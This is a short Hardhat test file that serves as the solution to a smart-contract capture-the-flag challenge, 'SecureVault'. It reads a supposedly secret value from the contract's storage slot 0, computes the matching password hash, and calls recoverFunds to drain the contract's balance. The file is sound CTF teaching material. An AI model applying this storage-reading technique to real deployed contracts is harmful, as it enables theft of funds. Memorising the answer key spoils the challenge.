const { expect } = require('chai');

// run the test
// npx hardhat test ./test/N1-SecureVault-easy.js
describe('CTF #1 SecureVault', function () {
  let challengeInstance, deployer;

  before(async function () {
    [deployer, alice] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory('N1SecureVault');
    challengeInstance = await Challenge.deploy({ value: ethers.utils.parseEther('0.0001') });
    await challengeInstance.deployed();
  });

  it('Should recover all funds', async function () {
    const secret = await ethers.provider.getStorageAt(challengeInstance.address, 0);
    const b2 = ethers.utils.parseEther('0.0002');
    const pass_packed = ethers.utils.solidityPack(["uint256", "uint256"],[secret, b2]);
    const pass = ethers.utils.keccak256(pass_packed);

    await challengeInstance.recoverFunds(pass, {
      value: ethers.utils.parseEther('0.0001')
    });
   
    expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal('0');
  });
});
